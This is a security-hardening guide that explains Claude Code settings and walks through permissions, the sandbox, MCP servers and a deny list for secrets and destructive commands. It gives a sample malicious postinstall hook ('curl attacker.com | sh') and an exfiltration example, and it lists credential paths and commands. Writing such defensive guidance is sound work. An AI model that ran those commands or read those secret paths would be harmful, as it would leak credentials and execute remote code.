# Claude Code Safest Settings

This document explains each setting in `.claude/settings.json` and why it's the safest option.

---

## Permissions

```json
"permissions": {
  "allow": [],
  "deny": [...],
  "additionalDirectories": [],
  "defaultMode": "default"
}
```

### `allow: []`

**Why empty:** Pre-allowing tools bypasses confirmation dialogs. Every pre-allowed action is an action you won't review. Zero pre-approvals means you see everything.

**Risk of allowing:** `"allow": ["Bash(npm run:*)"]` lets Claude run any npm script without asking. Malicious package could add `"postinstall": "curl attacker.com | sh"`.

### `deny: [...]`

**Why these patterns:**

| Pattern | Threat |
|---------|--------|
| `.env`, `.env.*` | API keys, database credentials, secrets |
| `secrets/**` | Common secrets directory |
| `**/credentials*` | AWS credentials, service accounts |
| `**/*secret*` | Files containing "secret" in name |
| `**/*.pem`, `**/*.key` | Private keys, certificates |
| `**/*_rsa` | SSH private keys |
| `~/.ssh/**` | SSH keys = server access |
| `~/.aws/**` | AWS credentials = cloud access |
| `~/.config/gcloud/**` | GCP credentials = cloud access |
| `rm -rf:*` | Destructive deletion |
| `curl\|wget:*` | Arbitrary downloads, data exfiltration |
| `chmod 777:*` | Dangerous permissions |
| `> /dev:*` | Writing to devices |

**Philosophy:** Deny by default for anything that could leak secrets or cause irreversible damage.

### `additionalDirectories: []`

**Why empty:** Every additional directory expands Claude's access. If needed, add explicitly and temporarily.

**Risk of adding:** `"additionalDirectories": ["../"]` gives access to parent directory - may contain other projects, secrets, or sensitive files.

### `defaultMode: "default"`

**Why "default":** Forces confirmation for every tool use.

| Mode | Risk |
|------|------|
| `default` | Safest - asks for everything |
| `acceptEdits` | Auto-accepts file edits without review |
| `dontAsk` | Auto-accepts all tools - very dangerous |
| `bypassPermissions` | No restrictions at all |

---

## Sandbox

```json
"sandbox": {
  "enabled": true,
  "autoAllowBashIfSandboxed": false,
  "excludedCommands": [],
  "allowUnsandboxedCommands": false
}
```

### `enabled: true`

**Why enabled:** Sandbox restricts bash commands to:
- Read/write only within project
- Limited network access
- No access to sensitive system paths

**Risk if disabled:** Bash can access entire filesystem, all network, all system resources.

### `autoAllowBashIfSandboxed: false`

**Why false:** Even sandboxed commands should be reviewed. Defense in depth.

**Risk if true:** Sandboxes can have bugs or bypasses. Reviewing commands catches suspicious patterns like:
- `cat ~/.bashrc >> /tmp/exfil`
- Encoded payloads
- Unexpected network calls

### `excludedCommands: []`

**Why empty:** Every excluded command runs without sandbox protection.

**Risk of excluding:** `"excludedCommands": ["docker"]` means Docker runs unsandboxed. Docker can:
- Mount any host path
- Access host network
- Run as root

### `allowUnsandboxedCommands: false`

**Why false:** Prevents Claude from using `dangerouslyDisableSandbox: true`.

**Risk if true:** Claude can bypass sandbox by claiming it's necessary. You'll see permission dialogs, but under time pressure you might approve.

---

## MCP Servers

```json
"enableAllProjectMcpServers": false,
"enabledMcpjsonServers": [],
"disabledMcpjsonServers": []
```

### `enableAllProjectMcpServers: false`

**Why false:** MCP servers are external processes. Auto-enabling means any `.mcp.json` in a cloned repo runs code on your machine.

**Risk if true:** Clone a repo with malicious MCP server → instant code execution.

### `enabledMcpjsonServers: []`

**Why empty:** Only enable servers you've audited and trust.

**How to add safely:**
1. Read the MCP server's source code
2. Understand what it accesses
3. Add specifically: `["memory"]` not `["*"]`

---

## Other

### `respectGitignore: true`

**Why true:** Gitignored files often contain:
- Build artifacts with embedded secrets
- Local config with credentials
- Cache files with sensitive data

This prevents Claude's `@` file picker from suggesting gitignored files.

---

## What's NOT in safest settings

These options are intentionally omitted (use defaults):

| Option | Why omitted |
|--------|-------------|
| `model` | Default model selection is fine |
| `alwaysThinkingEnabled` | No security impact |
| `language` | No security impact |
| `outputStyle` | No security impact |
| `attribution` | Transparency is good - keep defaults |
| `env` | Don't set env vars unless needed |
| `hooks` | Glass Claude adds via install.sh |

---

## Customizing for your project

**If you need to allow something:**

1. Be specific: `Bash(npm run test)` not `Bash(npm:*)`
2. Time-limit: add temporarily, remove after
3. Audit: watch `~/.claude/audit/audit.log`

**If sandbox breaks your workflow:**

1. Try `excludedCommands` for specific tools first
2. Never disable sandbox entirely
3. Never set `allowUnsandboxedCommands: true`

---

## Summary

| Category | Safest Choice | Why |
|----------|---------------|-----|
| `allow` | Empty | Review everything |
| `deny` | Block secrets, destructive commands | Prevent leaks, damage |
| `defaultMode` | `"default"` | Always ask |
| `sandbox.enabled` | `true` | Restrict bash |
| `autoAllowBashIfSandboxed` | `false` | Defense in depth |
| `excludedCommands` | Empty | No exceptions |
| `allowUnsandboxedCommands` | `false` | Prevent bypass |
| `enableAllProjectMcpServers` | `false` | No auto-execute |
